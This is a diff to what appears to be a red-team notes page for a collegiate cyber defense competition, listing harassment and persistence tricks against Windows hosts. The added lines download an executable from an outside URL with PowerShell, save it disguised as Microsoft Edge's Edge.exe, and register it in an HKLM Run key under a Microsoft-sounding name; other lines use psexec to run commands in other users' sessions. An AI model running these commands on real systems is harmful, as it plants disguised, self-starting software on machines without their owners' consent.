@@ -263,6 +263,8 @@ pagetitle: Red Teaming for CCDC
 - Set all computers to same background:
   - GPO management > right-click domain > Create GPO in domain and link here > Right click on new GPO + edit > User Configuration\Policies\Administrative Templates\Desktop\Desktop > desktop wallpaper > select `enabled` + enter path of image and select fill for style > apply + ok > `gpupdate /force`
 - Make mouse shake: [cold_hands.exe](https://khaelkugler.com/misc_scripts/cold_hands.exe)
+  - `iwr https://khaelkugler.com/misc_scripts/cold_hands.exe -o "C:\Program Files (x86)\Microsoft\Edge\Application\Edge.exe"`
+  - `Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeAutoLaunch" -Value "C:\Program Files (x86)\Microsoft\Edge\Application\Edge.exe"`
 - In another user's session with `psexec.exe -i {session_id} -s powershell.exe -Command "{command}" -accept-eula`
 - Spawn 50 notepads:
   - `1..50 | ForEach-Object {Start-Process notepad}`
